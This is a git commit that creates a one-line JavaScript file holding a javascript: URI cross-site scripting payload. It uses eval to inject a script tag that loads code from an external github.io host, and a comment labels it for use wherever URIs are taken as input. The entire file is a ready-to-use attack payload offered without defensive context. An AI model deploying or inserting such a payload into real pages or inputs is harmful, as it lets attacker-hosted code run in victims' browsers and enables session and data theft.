35352481251855629f0e5fbdb9674c6a97af8260
Bimal_Kumar_Sahoo <60147925+srb1mal@users.noreply.github.com>
2023-01-26 22:14:50 +0530

    Create 2.js

---
+++ 2.js
@@ -0,0 +1,3 @@
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://srb1mal.github.io\';document.body.appendChild(a)')
+
+###javascript: URI Payload - For use where URI's are taken as input.
